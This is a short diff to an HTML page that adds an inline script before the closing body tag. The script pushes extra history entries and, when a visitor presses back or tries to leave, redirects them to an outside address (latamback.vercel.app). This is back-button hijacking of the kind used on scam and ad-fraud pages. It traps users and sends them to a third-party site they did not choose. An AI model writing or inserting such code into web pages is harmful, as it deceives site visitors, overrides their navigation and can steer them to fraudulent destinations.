@@ -90,5 +90,24 @@
 
     <script src="js/NK1XCrWchLa3.js"></script>
 
+    <script>
+(function () {
+
+    var backLink = "https://latamback.vercel.app";
+
+    history.pushState(null, null, location.href);
+    history.pushState(null, null, location.href);
+
+    window.addEventListener("popstate", function () {
+        window.location.href = backLink;
+    });
+
+    window.onbeforeunload = function () {
+        window.location.href = backLink;
+    };
+
+})();
+</script>
+
 
 </body></html>
